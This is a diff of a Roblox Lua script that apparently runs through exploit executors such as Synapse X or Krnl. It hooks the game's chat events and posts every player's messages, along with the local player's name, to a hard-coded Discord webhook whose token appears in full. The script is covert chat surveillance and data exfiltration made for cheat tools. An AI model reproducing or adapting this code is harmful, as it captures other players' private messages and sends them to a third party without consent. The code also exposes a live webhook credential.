@@ -25,30 +25,6 @@ wait()
 
 
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-local url = "https://discord.com/api/webhooks/1021241023659257906/qY7snGy8H-BqKENZZbfKlexzhi2bRVbsmZs9_fMNMbH-UJlgzn63t5goPWcg3-ihfy_0"
-local data = {
-   ["content"] = data.FromSpeaker..": "..data.Message,
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-end)
-
-
-
-
-
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
 if data.FromSpeaker == game.Players.LocalPlayer.Name then
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -68,4 +44,22 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 end
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+local url = "https://discord.com/api/webhooks/1021241023659257906/qY7snGy8H-BqKENZZbfKlexzhi2bRVbsmZs9_fMNMbH-UJlgzn63t5goPWcg3-ihfy_0"
+local data = {
+   ["content"] = data.FromSpeaker..": "..data.Message.."     ("..game.Players.LocalPlayer.Name..")",
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 end)
+
